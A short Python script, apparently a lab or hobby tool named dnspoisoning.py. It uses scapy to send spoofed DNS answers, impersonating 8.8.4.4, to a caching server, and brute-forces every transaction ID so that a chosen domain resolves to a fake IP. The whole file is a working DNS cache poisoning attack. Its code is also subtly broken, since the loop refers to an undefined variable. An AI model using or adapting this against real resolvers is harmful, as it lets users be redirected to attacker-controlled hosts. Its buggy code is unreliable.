from scapy.all import *
from numba import njit

if len(sys.argv) < 3:
        print("Usage: dnspoisoning.py [target domain] [fake IP]")
        sys.exit()

domain = sys.argv[1]
fake_ip = sys.argv[2]
dns_cache_server_ip = "172.16.50.1"

dns_cache_server_port = 53

i = IP(dst=dns_cache_server_ip, src="8.8.4.4")
u = UDP(dport=dns_cache_server_port, sport=53)
d = DNS(id=0, qr=1, qd=DNSQR(qname=domain), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=domain).qname, type='A', ttl=3600, rdata=fake_ip)))
dns_response = i / u / d
dns_request = IP(dst=dns_cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype="A", qclass="IN"))
send(dns_response, verbose=0)
send(dns_request, verbose=0)

#@njit
for x in range(0, 65535):
    dns_response[DNS].id = x
    send(response, verbose=0)
